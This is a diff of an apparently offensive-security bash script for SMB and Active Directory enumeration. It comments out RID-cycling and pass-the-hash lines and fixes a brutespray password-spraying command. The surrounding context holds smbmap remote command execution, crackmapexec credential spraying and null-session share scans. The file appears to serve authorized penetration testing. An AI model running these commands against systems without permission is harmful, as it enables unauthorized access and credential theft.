@@ -129,8 +129,12 @@ smbmap -u username -p password --host-file $results_dir/list_hosts -x 'ipconfig'
 # Find aother user
 crackmapexec smb $IP -u username -p password --users | tee -a $results_dir/SMB_overall_results
 crackmapexec smb $IP -u users.txt -p password --continue-on-success | tee -a $results_dir/SMB_overall_results
-impacket-lookupsid example.local/user@$IP 20000 | tee -a $results_dir/SMB_overall_results
-crackmapexec smb $IP -u <username> -H hashes.txt | tee -a $results_dir/SMB_overall_results
+#Perform RID cycling attack against a DC with SMB null sessions allowed with impacket-lookupsid
+# Anonymous logon
+# 20000: Maximum RID to be cycled
+#impacket-lookupsid example.local/user@$IP 20000 | tee -a $results_dir/SMB_overall_results
+#crackmapexec smb $IP -u <username> -H hashes.txt | tee -a $results_dir/SMB_overall_results
+#Null scan for smb shares
 cme smb "$IP" -u '' -p '' --shares | tee -a $results_dir/SMB_overall_results
 
 echo -e $RED_LINE
@@ -308,7 +312,7 @@ echo -e $RED_LINE
   echo -e "${GREEN}|                                   |${RESET}"
   echo -e "${GREEN}+-----------------------------------+${RESET}"
 
-python3 $HOME/tools/brutespray/brutespray.py --file $results_dir/nmap_tcp_scan -U /usr/share/wordlist/user.txt -P /usr/share/wordlist/pass.txt -c -o password_spray_results
+python3 $HOME/tools/brutespray/brutespray.py --file $results_dir/nmap_tcp_scan.gnmap -U /usr/share/wordlist/user.txt -P /usr/share/wordlist/pass.txt -c -o password_spray_results
 
 echo -e $RED_LINE
 
